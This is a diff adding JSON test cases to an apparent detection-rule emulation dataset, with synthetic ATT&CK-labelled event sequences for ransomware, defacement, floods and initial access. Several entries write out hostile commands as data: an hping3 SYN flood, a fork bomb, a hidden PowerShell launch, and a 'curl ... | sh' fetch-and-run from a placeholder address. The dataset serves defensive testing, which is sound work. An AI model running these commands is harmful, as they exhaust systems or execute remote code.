+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\dir0\\README_RESTORE_FILES.txt",
+     "operation": "create"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\dir1\\README_RESTORE_FILES.txt",
+     "operation": "create"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\dir2\\README_RESTORE_FILES.txt",
+     "operation": "create"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\dir3\\README_RESTORE_FILES.txt",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1486"
+   ]
+  },
+  {
+   "id": "emu-t1486-ransom-extensions",
+   "name": "Mass rename to an unusual extension",
+   "description": "Synthetic event sequence emulating T1486: mass rename to an unusual extension. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1486"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f0.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f1.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f2.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f3.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f4.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f5.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f6.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f7.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f8.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f9.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f10.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f11.docx.locked",
+     "operation": "rename"
+    }
+   ],
+   "expect": [
+    "T1486"
+   ]
+  },
+  {
+   "id": "emu-t1491-001-defacement-wallpaper",
+   "name": "Replace the desktop wallpaper",
+   "description": "Synthetic event sequence emulating T1491.001: replace the desktop wallpaper. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1491.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\TranscodedWallpaper",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1491.001"
+   ]
+  },
+  {
+   "id": "emu-t1498-syn-flood-tool",
+   "name": "Packet flood tool",
+   "description": "Synthetic event sequence emulating T1498: packet flood tool. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1498"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/sbin/hping3",
+     "command": "hping3 -S --flood -p 80 10.0.0.5",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1498"
+   ]
+  },
+  {
+   "id": "emu-t1499-fork-bomb",
+   "name": "Fork bomb",
+   "description": "Synthetic event sequence emulating T1499: fork bomb. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1499"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": ":(){ :|:& };:",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1499"
+   ]
+  },
+  {
+   "id": "emu-t1078-valid-account-ssh-root",
+   "name": "Successful root SSH login from an unusual source",
+   "description": "Synthetic event sequence emulating T1078: successful root ssh login from an unusual source. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1078"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "root",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "success"
+    }
+   ],
+   "expect": [
+    "T1078"
+   ]
+  },
+  {
+   "id": "emu-t1133-external-rdp",
+   "name": "RDP session from a public address",
+   "description": "Synthetic event sequence emulating T1133: rdp session from a public address. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1133"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "administrator",
+     "source_ip": "198.51.100.40",
+     "method": "rdp",
+     "outcome": "success"
+    }
+   ],
+   "expect": [
+    "T1133"
+   ]
+  },
+  {
+   "id": "emu-t1190-webapp-exploit-shell",
+   "name": "Web server spawning a shell",
+   "description": "Synthetic event sequence emulating T1190: web server spawning a shell. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1190"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/sh",
+     "command": "sh -c 'id; uname -a'",
+     "parent_exe": "/usr/sbin/apache2",
+     "uid": 33
+    }
+   ],
+   "expect": [
+    "T1190"
+   ]
+  },
+  {
+   "id": "emu-t1566-001-phish-attachment",
+   "name": "Office process spawning cmd",
+   "description": "Synthetic event sequence emulating T1566.001: office process spawning cmd. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1566.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c powershell -w hidden -c calc",
+     "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    }
+   ],
+   "expect": [
+    "T1566.001"
+   ]
+  },
+  {
+   "id": "emu-t1195-002-supply-chain-npm",
+   "name": "Package install hook fetching a payload",
+   "description": "Synthetic event sequence emulating T1195.002: package install hook fetching a payload. Data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1195.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/node",
+     "command": "node install.js && curl -s http://203.0.113.9/p | sh",
+     "parent_exe": "/usr/bin/npm"
+    }
+   ],
+   "expect": [
+    "T1195.002"
+   ]
+  }
+ ]
+}
